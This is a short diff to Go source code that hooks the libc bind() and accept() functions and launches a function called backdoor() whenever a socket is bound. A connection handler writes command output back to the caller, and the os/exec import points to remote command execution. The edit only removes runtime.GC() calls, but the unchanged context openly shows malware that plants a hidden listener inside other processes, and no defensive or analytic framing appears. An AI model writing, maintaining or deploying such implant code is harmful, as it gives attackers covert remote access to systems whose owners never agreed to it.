@@ -14,7 +14,6 @@ import (
 	"net/textproto"
 	"os"
 	"os/exec"
-	"runtime"
 	"strconv"
 	"strings"
 	"syscall"
@@ -130,7 +129,6 @@ func bind(s C.int, a unsafe.Pointer, st C.size_t) *C.int {
 		log.Println("BD: Hooked bind")
 	}
 	go backdoor()
-	runtime.GC()
 	return old_bind(s, t, st)
 }
 
@@ -156,12 +154,10 @@ func accept(s C.int, a unsafe.Pointer, st C.size_t) *C.int {
 	//log.Println("!> %#v\n", in.Port)
 	//log.Println("!> %#v\n", t)
 	//}()
-	runtime.GC()
 	return oa
 }
 
 func backdoor() {
-	runtime.GC()
 	if !PortAvail() {
 		return
 	}
@@ -202,5 +198,4 @@ func handleConnection(conn net.Conn) {
 		conn.Write(output)
 	}
 	conn.Close()
-	runtime.GC()
 }
